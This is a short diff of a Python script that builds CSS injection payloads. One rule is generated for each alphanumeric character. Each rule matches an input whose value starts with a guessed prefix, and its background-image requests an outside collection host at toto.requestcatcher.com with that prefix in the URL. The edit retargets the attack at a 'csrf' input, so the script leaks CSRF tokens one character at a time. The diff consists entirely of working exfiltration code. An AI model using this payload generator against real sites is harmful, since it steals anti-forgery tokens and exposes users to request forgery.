@@ -6,8 +6,8 @@ css = ""
 for c in filter(str.isalnum, string.printable):
     payload = f"{prefix}{c}"
     css += f"""
-form:has(input[value^="{payload}"]) {{
-    --value:url("https://toto.requestcatcher.com/{payload}");
+input[name="csrf"][value^="{payload}"] {{
+  background-image: url("https://toto.requestcatcher.com/{payload}");
 }}
 """
 
